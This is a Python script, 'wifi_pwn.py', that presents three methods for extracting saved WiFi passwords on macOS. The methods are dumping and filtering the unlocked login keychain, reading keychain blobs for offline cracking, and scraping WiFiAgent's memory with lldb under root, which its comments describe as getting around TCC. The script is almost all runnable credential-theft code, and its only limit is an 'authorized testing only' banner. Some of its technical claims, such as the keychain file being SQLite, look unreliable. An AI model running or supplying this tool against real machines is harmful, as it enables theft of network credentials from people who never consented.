#!/usr/bin/env python3
"""
wifi_pwn.py — 3 methods to extract saved WiFi passwords on macOS
For authorized security testing only.
"""

import subprocess
import re
import os
import sys
import plistlib
import sqlite3
from tempfile import NamedTemporaryFile

# ──────────────────────────────────────────────
# METHOD 1:  dump-keychain (requires login pw)
# ──────────────────────────────────────────────
def method1_dump_keychain(login_password=None):
    """
    security dump-keychain is all-or-nothing.
    If you have the login password, unlock and dump everything,
    then filter for AirPort entries.
    """
    keychain = os.path.expanduser("~/Library/Keychains/login.keychain-db")

    if login_password:
        # Unlock with known password
        subprocess.run(
            ["security", "unlock-keychain", "-p", login_password, keychain],
            capture_output=True
        )

    # Dump all generic passwords
    result = subprocess.run(
        ["security", "dump-keychain", "-a", keychain],
        capture_output=True, text=True
    )

    if result.returncode != 0:
        return []

    entries = []
    blocks = result.stdout.split("keychain:")[1:]  # split by keychain entries
    for block in blocks:
        if "AirPort" in block:
            ssid_match = re.search(r'"acct"<blob>="(.+?)"', block)
            pwd_match  = re.search(r'"data"<blob>="(.+?)"', block)
            if ssid_match and pwd_match:
                entries.append((ssid_match.group(1), pwd_match.group(1)))
    return entries


# ──────────────────────────────────────────────
# METHOD 2:  SQLite direct + blobs
# ──────────────────────────────────────────────
def method2_sqlite_extraction():
    """
    The login keychain is an SQLite db on modern macOS.
    We can't decrypt the password blobs without the keychain
    master key, but we can enumerate SSIDs + extract raw blobs
    for offline cracking via keychain2john.
    """
    keychain = os.path.expanduser("~/Library/Keychains/login.keychain-db")
    if not os.path.exists(keychain):
        print("[!] keychain db not found at", keychain)
        return []

    conn = sqlite3.connect(keychain)
    cursor = conn.cursor()

    # genp = generic passwords table
    try:
        rows = cursor.execute("SELECT agrp, acct, data, svce FROM genp").fetchall()
    except sqlite3.OperationalError:
        conn.close()
        return []

    entries = []
    for agrp, acct, data, svce in rows:
        if "AirPort" in str(agrp) or "WiFi" in str(svce):
            entries.append((acct, data))
    conn.close()
    return entries


# ──────────────────────────────────────────────
# METHOD 3:  Memory scraping WiFiAgent
# ──────────────────────────────────────────────
def method3_memory_scrape():
    """
    The WiFiAgent process holds the current network's PSK in heap.
    Dump its writable memory regions and grep for the password.
    Requires sudo (TCC bypass is the whole point of this method).
    """
    # Find WiFiAgent PID
    pid = None
    result = subprocess.run(["pgrep", "-x", "WiFiAgent"], capture_output=True, text=True)
    if result.returncode == 0 and result.stdout.strip():
        pid = result.stdout.strip().split("\n")[0]
    else:
        result = subprocess.run(["pgrep", "-x", "AirPort"], capture_output=True, text=True)
        if result.returncode == 0 and result.stdout.strip():
            pid = result.stdout.strip().split("\n")[0]
        else:
            # Fallback: check common daemons
            for name in ["WiFiAgent", "AirPort", "corewifid", "wifi"]:
                r = subprocess.run(["pgrep", "-x", name], capture_output=True, text=True)
                if r.returncode == 0 and r.stdout.strip():
                    pid = r.stdout.strip().split("\n")[0]
                    break

    if not pid:
        print("[!] no WiFiAgent or AirPort process found")
        return []

    # Get memory regions
    result = subprocess.run(
        ["vmmap", "-pages", pid],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        return []

    # Find writable regions
    candidates = []
    for line in result.stdout.split("\n"):
        parts = re.split(r"\s+", line)
        if len(parts) >= 3 and "rw-" in parts[2]:
            m = re.match(r"([0-9a-f]+)", parts[0])
            if m:
                candidates.append(m.group(1))

    # Search in the first few writable pages
    # On modern SIP'd macOS, /dev/mem is restricted, so we use
    # lldb to attach and read memory.
    passwords = set()
    for addr in candidates[:5]:
        cmd = ["lldb", "-p", pid, "-o",
               f"memory read --outfile /tmp/wifi_mem.bin 0x{addr} 0x2000",
               "-o", "quit"]
        subprocess.run(cmd, capture_output=True, text=True)

        if os.path.exists("/tmp/wifi_mem.bin"):
            with open("/tmp/wifi_mem.bin", "rb") as f:
                data = f.read()
            strings = re.findall(rb"[^\x00-\x1f]{8,}", data)
            for s in strings:
                try:
                    decoded = s.decode("utf-8", errors="ignore")
                    if 8 <= len(decoded) <= 128:
                        passwords.add(decoded)
                except:
                    pass
            os.remove("/tmp/wifi_mem.bin")

    return list(passwords)


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────
if __name__ == "__main__":
    print("=" * 60)
    print("wifi_pwn.py  —  for authorized testing only")
    print("=" * 60)

    # Method 1
    print("\n[1] Method: dump-keychain (provide login pw)")
    pw = input("    login password (blank to skip): ").strip()
    if pw:
        nets = method1_dump_keychain(pw)
        for ssid, pwd in nets:
            print(f"    {ssid:30s} → {pwd}")

    # Method 2
    print("\n[2] Method: SQLite keychain read (blob dump)")
    entries = method2_sqlite_extraction()
    for acct, blob in entries[:10]:
        blob_hex = blob[:64] if blob else "(none)"
        print(f"    {acct:30s} → blob (hex): {blob_hex}...")

    # Method 3
    print("\n[3] Method: WiFiAgent memory scrape")
    lldb_check = subprocess.run(["which", "lldb"], capture_output=True)
    user = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
    if lldb_check.returncode != 0:
        print("    [skip] lldb not installed")
    elif user != "root":
        print("    [skip] requires sudo:  sudo python3 wifi_pwn.py")
    else:
        guesses = method3_memory_scrape()
        print(f"    found {len(guesses)} candidate strings from heap")
        for g in guesses:
            print(f"    possible: {g}")
